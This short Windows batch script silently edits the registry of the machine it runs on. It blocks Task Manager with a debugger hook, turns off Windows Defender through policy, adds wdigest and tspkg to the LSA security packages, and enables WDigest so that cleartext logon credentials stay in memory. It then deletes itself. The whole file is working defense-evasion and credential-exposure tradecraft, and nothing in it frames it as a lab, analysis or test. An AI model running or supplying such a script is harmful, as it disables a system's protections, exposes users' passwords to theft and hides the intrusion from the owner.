@echo off
:: Direct Registry Modifications via Console

:: 1. Disable Task Manager Debugger Hook
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "Debugger" /t REG_SZ /d "Hotkey Disabled" /f >nul 2>&1

:: 2. Disable Windows Defender AntiSpyware Policy
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1

:: 3. Configure LSA Security Packages (REG_MULTI_SZ)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u" /f >nul 2>&1

:: 4. Enable WDigest Logon Credentials
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v "UseLogonCredential" /t REG_DWORD /d 1 /f >nul 2>&1

:: 5. Set Security Providers
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders" /v "SecurityProviders" /t REG_SZ /d "msapsspc.dll, schannel.dll, digest.dll, msnsspc.dll, credssp.dll" /f >nul 2>&1

:: Self-Deletion Subroutine (Permanent Wipe)
start /b "" cmd /c del /f /q "%~f0" & exit